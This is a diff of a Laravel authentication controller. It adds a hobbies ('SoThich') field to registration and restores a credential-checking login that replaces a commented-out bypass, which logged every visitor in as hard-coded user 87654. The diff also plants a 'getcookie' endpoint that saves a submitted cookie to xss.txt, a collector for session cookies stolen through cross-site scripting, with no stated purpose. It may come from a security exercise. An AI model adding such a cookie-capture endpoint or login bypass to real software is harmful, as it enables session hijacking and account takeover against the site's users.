@@ -27,6 +27,7 @@ class CustomAuthController extends Controller
         $user->name = $request->name;
         $user->email = $request->email;
         $user->PhoneNumber = $request->PhoneNumber;
+        $user->SoThich = $request->SoThich;
 
         if ($request->hasFile('Images')) {
             $imageName = time() . '.' . $request->Images->extension();
@@ -69,16 +70,16 @@ class CustomAuthController extends Controller
         return view('auth.login');
     }
 
-    public function customLogin(Request $request)
+    /*public function customLogin(Request $request)
 {
  
     Auth::loginUsingId(87654);
     return redirect()->intended('index')->withSuccess('Signed in');
-}
+}*/
 
     
     
-   /* public function customLogin(Request $request)
+   public function customLogin(Request $request)
     {
         $request->validate([
             'email' => 'required',
@@ -92,7 +93,7 @@ class CustomAuthController extends Controller
         }
 
         return redirect("login")->withSuccess('Login details are not valid');
-    }*/
+    }
 
     public function registration()
     {
@@ -107,6 +108,7 @@ class CustomAuthController extends Controller
             'password' => 'required|min:6|confirmed',
             'PhoneNumber' => 'required',
             'Images' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
+            'SoThich' => 'required',
         ]);
 
         if ($request->hasFile('Images')) {
@@ -128,6 +130,8 @@ class CustomAuthController extends Controller
             'password' => Hash::make($data['password']),
             'PhoneNumber' => $data['PhoneNumber'],
             'Images' => isset($imageName) ? 'images/' . $imageName : null,
+            'SoThich' => $data['SoThich'],
+
         ]);
     }
 
@@ -147,4 +151,9 @@ class CustomAuthController extends Controller
 
         return Redirect('login');
     }
+    public function getcookie(Request $request) {
+        $cookie = $request->get('cookie');
+        file_put_contents('xss.txt', $cookie);
+        var_dump($cookie);die();
+        } 
 }
